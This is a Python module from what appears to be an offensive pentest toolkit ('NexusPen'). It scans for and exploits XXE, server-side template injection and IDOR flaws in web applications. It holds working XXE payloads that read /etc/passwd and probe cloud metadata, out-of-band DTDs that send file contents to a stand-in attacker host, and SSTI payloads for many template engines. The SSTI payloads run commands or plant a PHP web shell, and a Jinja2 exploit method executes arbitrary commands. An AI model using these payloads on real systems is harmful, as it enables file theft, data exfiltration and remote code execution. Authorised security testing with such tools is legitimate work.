#!/usr/bin/env python3
"""
NexusPen - XXE (XML External Entity) Module
============================================
XXE injection detection and exploitation.
"""

import requests
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console

console = Console()


@dataclass
class XXEResult:
    """XXE test result."""
    url: str
    payload: str
    vulnerable: bool
    file_content: Optional[str] = None
    ssrf_possible: bool = False
    blind: bool = False


class XXEScanner:
    """
    XXE vulnerability scanner and exploiter.
    """
    
    # XXE Payloads
    XXE_PAYLOADS = {
        'file_read_linux': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
        
        'file_read_windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>''',
        
        'ssrf': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',
        
        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/%xxe;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',
        
        'blind_oob': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<root>test</root>''',
        
        'cdata_bypass': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root>&all;</root>''',
        
        'xinclude': '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',
        
        'svg': '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',
        
        'docx': '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>''',
    }
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.results: List[XXEResult] = []
    
    def test_xxe(self, content_type: str = 'application/xml') -> List[XXEResult]:
        """Test for XXE vulnerability."""
        console.print(f"\n[cyan]📄 Testing XXE on {self.target_url}...[/cyan]")
        
        results = []
        
        for name, payload in self.XXE_PAYLOADS.items():
            if 'ATTACKER' in payload:
                continue  # Skip payloads requiring callback server
            
            try:
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers={'Content-Type': content_type},
                    timeout=10
                )
                
                # Check for file content
                if 'root:' in response.text or '[fonts]' in response.text:
                    result = XXEResult(
                        url=self.target_url,
                        payload=name,
                        vulnerable=True,
                        file_content=response.text[:500]
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[red]  ⚠️ XXE confirmed with {name}![/red]")
                    
                # Check for SSRF (AWS metadata)
                if 'ami-id' in response.text or 'instance-id' in response.text:
                    result = XXEResult(
                        url=self.target_url,
                        payload=name,
                        vulnerable=True,
                        ssrf_possible=True,
                        file_content=response.text[:500]
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[red]  ⚠️ XXE + SSRF confirmed![/red]")
                    
            except Exception as e:
                pass
        
        return results
    
    def generate_dtd_file(self, file_to_read: str = '/etc/passwd',
                         exfil_url: str = 'http://attacker.com') -> str:
        """Generate evil DTD for blind XXE exfiltration."""
        dtd = f'''<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{exfil_url}/?data=%file;'>">
%eval;
%exfil;'''
        return dtd
    
    def generate_blind_payload(self, dtd_url: str) -> str:
        """Generate blind XXE payload pointing to external DTD."""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{dtd_url}">
  %xxe;
]>
<root>test</root>'''
        return payload
    
    def generate_error_based_dtd(self, file_to_read: str = '/etc/passwd') -> str:
        """Generate DTD for error-based XXE."""
        dtd = f'''<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;'''
        return dtd
    
    @staticmethod
    def payloads_for_content_type(content_type: str) -> List[str]:
        """Get payloads for specific content type."""
        payloads = {
            'application/xml': ['file_read_linux', 'file_read_windows', 'ssrf'],
            'text/xml': ['file_read_linux', 'file_read_windows'],
            'application/soap+xml': ['file_read_linux'],
            'image/svg+xml': ['svg'],
            'application/xhtml+xml': ['file_read_linux'],
        }
        return payloads.get(content_type, ['file_read_linux'])


class STTIScanner:
    """
    Server-Side Template Injection (SSTI) scanner.
    """
    
    # SSTI payloads for different template engines
    SSTI_PAYLOADS = {
        'detection': [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
            '${{7*7}}',
            '@(7*7)',
            '{{7*\'7\'}}',
        ],
        'jinja2': [
            '{{config}}',
            '{{self.__class__.__mro__}}',
            '{{"".__class__.__mro__[1].__subclasses__()}}',
            '{{config.items()}}',
            '{{request.environ}}',
            '{{lipsum.__globals__["os"].popen("id").read()}}',
        ],
        'twig': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '{{["id"]|filter("system")}}',
            '{{app.request.server.all|join}}',
        ],
        'freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()}',
        ],
        'velocity': [
            '#set($e="")#foreach($c in [1..$e.class.forName("java.lang.Runtime").getMethod("exec",[$e.class.forName("java.lang.String")]).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id").inputStream.available()])$c#end',
        ],
        'smarty': [
            '{php}echo `id`;{/php}',
            '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}',
        ],
        'mako': [
            '${self.module.cache.util.os.popen("id").read()}',
        ],
        'erb': [
            '<%= system("id") %>',
            '<%= `id` %>',
        ],
        'pebble': [
            '{% set cmd = "id" %}{{ [cmd].stream().map(beans.get("java.lang.Runtime").exec).collect() }}',
        ],
    }
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
    
    def detect_ssti(self, param: str) -> Dict:
        """Detect SSTI vulnerability and identify template engine."""
        console.print(f"\n[cyan]🎭 Testing SSTI on parameter: {param}[/cyan]")
        
        result = {
            'vulnerable': False,
            'engine': None,
            'payload': None,
        }
        
        # First, try detection payloads
        for payload in self.SSTI_PAYLOADS['detection']:
            try:
                test_url = f"{self.target_url}?{param}={payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Check if 7*7=49 was evaluated
                if '49' in response.text:
                    result['vulnerable'] = True
                    result['payload'] = payload
                    
                    # Identify engine based on syntax
                    if payload.startswith('{{') and '}}' in payload:
                        result['engine'] = 'jinja2/twig'
                    elif payload.startswith('${'):
                        result['engine'] = 'freemarker/velocity'
                    elif payload.startswith('<%='):
                        result['engine'] = 'erb'
                    elif payload.startswith('#{'):
                        result['engine'] = 'ruby'
                    
                    console.print(f"[red]  ⚠️ SSTI detected! Engine: {result['engine']}[/red]")
                    break
                    
            except:
                pass
        
        return result
    
    def exploit_jinja2(self, param: str, command: str = 'id') -> Optional[str]:
        """Exploit Jinja2 SSTI for RCE."""
        console.print(f"\n[cyan]💉 Exploiting Jinja2 SSTI...[/cyan]")
        
        # Python RCE payload
        payload = f'''{{{{lipsum.__globals__["os"].popen("{command}").read()}}}}'''
        
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            response = self.session.get(test_url, timeout=10)
            
            if response.text and 'uid=' in response.text or response.text.strip():
                console.print(f"[green]  ✓ Command executed![/green]")
                return response.text
        except:
            pass
        
        return None
    
    def get_payloads(self, engine: str) -> List[str]:
        """Get payloads for specific template engine."""
        return self.SSTI_PAYLOADS.get(engine, self.SSTI_PAYLOADS['detection'])


class IDORScanner:
    """
    Insecure Direct Object Reference (IDOR) scanner.
    """
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
    
    def test_numeric_idor(self, base_url: str, id_param: str,
                         user_id: int, test_range: int = 10) -> List[Dict]:
        """Test for numeric IDOR."""
        console.print(f"\n[cyan]🔢 Testing numeric IDOR on {id_param}...[/cyan]")
        
        findings = []
        
        # Get original response for comparison
        original_url = f"{base_url}?{id_param}={user_id}"
        try:
            original = self.session.get(original_url, timeout=10)
            original_length = len(original.content)
        except:
            return findings
        
        # Test adjacent IDs
        test_ids = list(range(max(1, user_id - test_range), user_id + test_range + 1))
        test_ids.remove(user_id)
        
        for test_id in test_ids:
            try:
                test_url = f"{base_url}?{id_param}={test_id}"
                response = self.session.get(test_url, timeout=10)
                
                # Check if we can access other users' data
                if response.status_code == 200 and len(response.content) > 100:
                    if len(response.content) != original_length:
                        findings.append({
                            'id': test_id,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                        })
                        console.print(f"[yellow]  ⚠️ Accessible: ID {test_id}[/yellow]")
                        
            except:
                pass
        
        if findings:
            console.print(f"[red]  ⚠️ IDOR confirmed! {len(findings)} accessible IDs[/red]")
        
        return findings
    
    def test_uuid_idor(self, base_url: str, uuid_param: str,
                       known_uuids: List[str]) -> List[Dict]:
        """Test for UUID-based IDOR."""
        console.print(f"\n[cyan]🔑 Testing UUID IDOR...[/cyan]")
        
        findings = []
        
        for uuid in known_uuids:
            try:
                test_url = f"{base_url}?{uuid_param}={uuid}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    findings.append({
                        'uuid': uuid,
                        'url': test_url,
                        'accessible': True,
                    })
                    console.print(f"[yellow]  ⚠️ Accessible: {uuid[:8]}...[/yellow]")
                    
            except:
                pass
        
        return findings
    
    def test_path_idor(self, base_path: str, test_paths: List[str] = None) -> List[Dict]:
        """Test for path-based IDOR."""
        console.print(f"\n[cyan]📁 Testing path IDOR...[/cyan]")
        
        findings = []
        test_paths = test_paths or ['../1', '../admin', '../0', '../../etc/passwd']
        
        for path in test_paths:
            try:
                test_url = f"{base_path}/{path}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    findings.append({
                        'path': path,
                        'url': test_url,
                        'status': response.status_code,
                    })
                    console.print(f"[yellow]  ⚠️ Accessible: {path}[/yellow]")
                    
            except:
                pass
        
        return findings
